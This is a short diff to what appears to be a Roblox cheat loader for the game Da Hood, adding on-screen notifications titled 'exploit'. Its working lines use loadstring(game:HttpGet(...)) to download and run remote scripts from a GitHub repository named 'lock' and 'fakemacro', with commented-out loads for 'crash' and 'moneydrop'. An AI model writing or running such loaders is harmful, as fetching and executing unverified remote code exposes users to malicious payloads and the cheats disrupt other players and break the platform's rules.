@@ -1,9 +1,15 @@
 print('start loading')
-print('changing health')
+game.StarterGui:SetCore("SendNotification", {
+    Title = "exploit",
+    Text = "loading;"
+})
 wait(1)
-
 --loadstring(game:HttpGet('https://raw.githubusercontent.com/humanrian/roblox/main/dahood/crash'))()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/humanrian/roblox/main/dahood/lock'))()
 --loadstring(game:HttpGet('https://raw.githubusercontent.com/humanrian/roblox/main/dahood/moneydrop'),true)()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/humanrian/roblox/main/dahood/fakemacro'))()
 print('loading done')
+game.StarterGui:SetCore("SendNotification", {
+    Title = "exploit",
+    Text = "loaded;"
+})
